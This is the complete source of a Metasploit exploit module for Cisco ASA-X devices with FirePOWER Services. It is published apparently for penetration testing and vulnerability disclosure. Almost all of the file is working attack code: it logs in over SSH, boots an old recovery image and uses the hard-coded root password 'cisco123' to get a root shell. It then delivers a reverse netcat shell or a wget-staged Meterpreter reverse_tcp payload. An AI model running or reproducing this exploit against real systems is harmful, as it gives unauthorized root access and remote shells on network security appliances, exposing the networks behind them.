##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SSH
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASA-X with FirePOWER Services Boot Image Remote Code Execution',
        'Description' => %q{
          This module installs a FirePOWER Services Boot Image that is present on a remote ASA-X with
          FirePOWER Services and then uses hard-coded credentials to achieve a root Linux shell. This
          position gives the attacker access to "inside" and "outside" of the ASA, assuming the
          management interface is wired.

          The Boot Image root shell does not persist through reboots. Furthermore, the hardcoded
          credentials were "hardened" out over Boot Images >= 7.0.0. However, as the ASA-X does not
          restrict which boot image you use, so as long as you have access to an old image, you
          should be able to upload it to the ASA and install it.

          This module configures the Boot Image to use DHCP after it boots up. If the image does not
          acquire an address then it won't be useful. Another oddity, is that an attacker can use a
          non-Cisco created ISO as a boot image. This module doesn't implement that, but see the
          slowcheetah exploit referenced below. 
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'jbaines-r7'
        ],
        'References' => [
          [ 'URL', 'https://github.com/jbaines-r7/slowcheetah' ],
          [ 'URL', 'https://github.com/jbaines-r7/pinchme' ],
          [ 'URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvu90861']
        ],
        'DisclosureDate' => '2022-09-10',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'wget' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DefaultOptions' => {
          'MeterpreterTryToFork' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(22),
        OptString.new('USERNAME', [ true, 'The username for authentication', 'cisco' ]),
        OptString.new('PASSWORD', [ true, 'The password for authentication', 'cisco123' ]),
        OptString.new('ENABLE_PASSWORD', [true, 'The enable password', '']),
        OptString.new('IMAGE_PATH', [true, 'The path to the image on the ASA (e.g. disk0:/asasfr-5500x-boot-6.2.3-4.img', ''])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def connect
    opts = ssh_client_defaults.merge({
      auth_methods: ['password'],
      port: rport,
      password: password
    })
    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    print_status("#{rhost}:#{rport} - Attempting to login...")
    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh = Net::SSH.start(rhost, username, opts)
        print_good('Authenticated with the remote server')
        return ssh
      end
    rescue Rex::ConnectionError
      return nil
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return nil
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return nil
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication due wrong credentials."
      return nil
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return nil
    end
  end

  def get_root_shell(cmd, channel)
    state = 0
    buffer = ''

    print_status('Dropping to the root shell')
    channel.on_data do |_ch, data|
      buffer += data
      vprint_status data.strip
      case state
      when 0
        if buffer.include? 'asasfr-boot>'
          channel.send_data("exit\n")
          buffer = ''
          state = 1
        end
      when 1
        if buffer.include? 'asasfr login: '
          channel.send_data("root\n")
          buffer = ''
          state = 2
        end
      when 2 # log in
        if buffer.include? 'Password: '
          channel.send_data("cisco123\n")
          buffer = ''
          state = 3
        end
      when 3
        if buffer.include? ':~#'
          print_status(cmd.to_s)
          channel.send_data("#{cmd}\n")
          buffer = ''
          state = 4
        end
      when 4
        if buffer.include? ':~#'
          channel.send_data("exit\n")
          buffer = ''
          state = 5
        end
      when 5
        if buffer.include? 'asasfr login:'
          channel.close
          buffer = ''
          print_good('Done!')
        end
      end
    end
  end

  def configure_shell(cmd, channel)
    state = 0
    buffer = ''

    print_status('Configuring DHCP for the image')
    channel.on_data do |_ch, data|
      buffer += data
      vprint_status data.strip
      case state
      when 0 # log in
        if buffer.include? 'asasfr login:'
          channel.send_data("admin\n")
          buffer = ''
          state = 1
        else
          channel.send_data("\n")
        end
      when 1 # log in
        if buffer.include? 'Password: '
          channel.send_data("Admin123\n")
          buffer = ''
          state = 2
        end
      when 2 # initiate setup
        if buffer.include? 'asasfr-boot>'
          channel.send_data("setup\n")
          buffer = ''
          state = 3
        end
      when 3
        if buffer.include? 'Enter a hostname'
          channel.send_data("\n")
          buffer = ''
        elsif buffer.include? 'Do you want to configure IPv4 address'
          channel.send_data("y\n")
          buffer = ''
        elsif buffer.include? 'Do you want to enable DHCP for IPv4'
          channel.send_data("y\n")
          buffer = ''
        elsif buffer.include? 'Do you want to configure static'
          channel.send_data("n\n")
          buffer = ''
        elsif buffer.include? 'Do you want to enable the NTP'
          channel.send_data("n\n")
          buffer = ''
        elsif buffer.include? 'Apply the change'
          channel.send_data("y\n")
          buffer = ''
        elsif buffer.include? 'Press ENTER to continue...'
          channel.send_data("\n")
          get_root_shell(cmd, channel)
        end
      end
    end
  end

  def boot_recover_image(cmd, channel)
    state = 0
    buffer = ''

    print_status('Booting the image... this will take a few minutes')

    # tell the ASA the boot image we'll use
    channel.send_data("sw-module module sfr recover configure image #{datastore['IMAGE_PATH']}\n")

    channel.on_data do |_ch, data|
      buffer += data
      vprint_status data.strip
      case state
      when 0
        if buffer.include? '# '
          channel.send_data("debug module-boot\n")
          buffer = ''
          state = 1
        end
      when 1
        if buffer.include? '# '
          channel.send_data("sw-module module sfr recover boot\n")
          buffer = ''
          state = 2
        end
      when 2 # confirm boot
        if buffer.include? 'Recover module sfr? [confirm]'
          channel.send_data("\n")
          buffer = ''
          state = 3
        end
      when 3 # booting done
        if buffer.include? 'Cisco FirePOWER Services Boot Image'
          channel.send_data("\nsession sfr console\n")
          configure_shell(cmd, channel)
        end
      end
    end
  end

  def exploitable?(cmd)
    ssh = connect
    fail_with(Failure::Unknown, 'Could not establish an SSH session') unless ssh
    ssh.open_channel do |channel|
      channel.request_pty do |ch, success|
        fail_with(Failure::Unknown, 'Could not request pty!') unless success
        ch.send_channel_request('shell') do |_ch, shell_success|
          fail_with(Failure::Unknown, 'Could not open shell!') unless shell_success
        end
      end

      state = 0
      buffer = ''
      channel.on_data do |_ch, data|
        buffer += data
        vprint_status data.strip
        case state
        when 0 # get enable prompt
          if buffer.include? 'Password: '
            channel.send_data("#{datastore['ENABLE_PASSWORD']}\n")
            buffer = ''
          elsif buffer.include? 'Invalid password'
            fail_with(failure::BadConfig, 'Invalid enable password')
          elsif buffer.include? '# '
            # request information on the sfr module to determine if it's supported
            channel.send_data("show module sfr\n")
            state = 1
            buffer = ''
          elsif buffer.include? '> '
            channel.send_data("enable\n")
            buffer = ''
          end

        when 1 # determine sfr support
          if buffer.include? 'ERROR'
            fail_with(Failure::NotVulnerable, 'Does not support the SFR module')
          elsif buffer.include? 'sfr Recover '
            channel.send_data("sw-module module sfr recover stop\n")
            buffer = ''
            state = 2
          elsif buffer.include? 'sfr Unresponsive'
            channel.send_data("sw-module module sfr recover configure image disk0:/asasfr-5500x-boot-6.2.3-4.img\n")
            boot_recover_image(cmd, channel)
          elsif data.include? 'sfr Init'
            fail_with(Failure::NoAccess, 'The target is exploitable but still in the non-exploitable init state')
          end

        when 2
          if buffer.include? 'This may take several minutes to complete.'
            print_status('Resetting SFR. Sleep for 120 seconds')
            sleep(120)
            boot_recover_image(cmd, channel)
          end
        end
      end
    end
    begin
      ssh.loop unless session_created?
    rescue Errno::EBADF => e
      elog(e)
    end
  end

  def execute_command(cmd, _opts = {})
    exploitable? cmd
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(linemax: 144)
    end
  end
end
